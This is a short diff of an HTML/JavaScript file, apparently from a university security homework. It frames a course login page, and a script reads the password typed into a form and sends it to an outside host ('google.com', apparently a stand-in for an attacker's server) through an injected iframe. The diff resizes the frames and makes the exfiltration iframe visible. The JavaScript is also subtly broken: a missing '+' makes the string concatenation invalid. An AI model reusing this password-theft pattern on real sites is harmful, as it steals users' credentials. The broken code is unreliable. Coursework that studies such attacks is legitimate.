@@ -1,5 +1,5 @@
 <html>
-    <iframe height="1000" width="1000" src="http://calculus.sisl.rites.uic.edu:443/6e3357a8/hw4/web-app/Login.jsp"></iframe>
+    <iframe height="500" width="500" src="http://calculus.sisl.rites.uic.edu:443/6e3357a8/hw4/web-app/Login.jsp"></iframe>
 </html>
 
 <script>
@@ -7,7 +7,7 @@
 		var password = document.forms[0].password.value;
 		if(password != ""){
 			var temp = document.createElement("div");
-			temp.innerHTML += "<iFrame src=\""+ "google.com" + "?password=" + password "\" style=\"display:none;\" />;
+			temp.innerHTML += "<iFrame src=\""+ "google.com" + "?password=" + password "\" height=\"500\" width=\"500\" />";
 			document.body.appendChild(temp);
 			clearInterval(interval);
 		}
